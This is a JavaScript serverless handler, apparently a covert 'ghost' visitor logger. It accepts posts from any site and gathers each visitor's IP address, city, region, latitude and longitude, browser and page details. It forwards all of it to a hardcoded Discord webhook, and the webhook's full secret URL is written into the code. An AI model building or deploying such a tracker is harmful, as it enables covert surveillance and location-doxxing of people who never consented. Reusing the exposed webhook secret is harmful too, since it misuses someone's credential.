const DEFAULT_WEBHOOK =
  'https://discord.com/api/webhooks/1572940915574575114/0MZcv9pw8BdS52BXZnMah9CsglfLvOVN-GLnMMR25oMmfB2cMRknIs9MC7I06bZDMrjV';

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');

  if (req.method === 'OPTIONS') {
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    return res.status(204).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ ok: false });
  }

  const ip =
    (req.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
    req.headers['x-real-ip'] ||
    (req.socket && req.socket.remoteAddress) ||
    'unknown';

  const b = req.body || {};

  const entry = {
    ts: Date.now(),
    ip,
    ua: b.ua || req.headers['user-agent'] || '',
    ref: b.ref || '',
    page: b.page || '',
    host: b.host || '',
    tz: b.tz || '',
    lang: b.lang || '',
    screen: b.screen || '',
    id: b.id || '',
    country: req.headers['x-vercel-ip-country'] || '',
    city: req.headers['x-vercel-ip-city'] || '',
    region: req.headers['x-vercel-ip-country-region'] || '',
    lat: req.headers['x-vercel-ip-latitude'] || '',
    lon: req.headers['x-vercel-ip-longitude'] || ''
  };

  console.log('[ghost]', JSON.stringify(entry));

  const hook = process.env.DISCORD_WEBHOOK || DEFAULT_WEBHOOK;

  const payload = {
    username: 'ghost',
    embeds: [
      {
        title: entry.host || 'unknown host',
        color: 0x3b82f6,
        timestamp: new Date(entry.ts).toISOString(),
        fields: [
          { name: 'IP', value: entry.ip || '—', inline: true },
          {
            name: 'Geo',
            value:
              `${entry.country || '?'}` +
              (entry.city ? ` / ${entry.city}` : '') +
              (entry.region ? ` (${entry.region})` : ''),
            inline: true
          },
          {
            name: 'Coords',
            value:
              entry.lat && entry.lon ? `${entry.lat}, ${entry.lon}` : '—',
            inline: true
          },
          { name: 'Page', value: (entry.page || '—').slice(0, 1000) },
          { name: 'Referrer', value: (entry.ref || '—').slice(0, 1000) },
          {
            name: 'Client',
            value: `${entry.lang || '?'} · ${entry.tz || '?'} · ${entry.screen || '?'}`
          },
          { name: 'UA', value: ('`' + (entry.ua || '—') + '`').slice(0, 1000) }
        ],
        footer: { text: entry.id ? `id: ${entry.id}` : 'ghost' }
      }
    ]
  };

  try {
    await fetch(hook, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch (e) {
    console.error('[discord]', e && e.message);
  }

  return res.status(200).json({ ok: true });
}
